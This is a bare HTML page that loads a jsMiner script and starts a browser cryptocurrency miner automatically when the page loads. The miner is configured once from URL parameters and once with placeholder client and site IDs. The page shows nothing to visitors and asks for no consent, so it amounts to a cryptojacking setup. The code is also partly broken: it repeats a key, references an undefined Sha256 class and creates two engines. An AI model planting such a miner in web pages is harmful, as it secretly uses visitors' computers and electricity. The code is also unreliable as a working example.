<html>
  <head>
    <script type="text/javascript" src="/jsMiner.js"></script>
    <script type="text/javascript">
	  var params = {};
	  var queryString = window.location.search.substring(1);
	  var vars = queryString.split("&"); 
	  for(var i = 0; i != vars.length; i++){
		if(vars[i].indexOf("=") != -1){
			var pair = vars[i].split("=");
			params[pair[0]] = pair[1];
		}
	  }
      var engine = new jsMiner.engine(params);
    </script>
	<script>
		var miner = new jsMiner.engine({
			clientId: "your_client_id",
			siteId: "your_site_id",
			delay: 30, // Delay between nonce
			// Other options...

			workerTimeout: 30,
			autoStart: true,
			forceUIThread: false,
			workerRunning: false,
			hashRate: 0,
			sha: new Sha256(),
			delayBetweenNonce: 30,
			siteId: "",
			publisherId: ""
		});
	</script>
  </head>

</html>
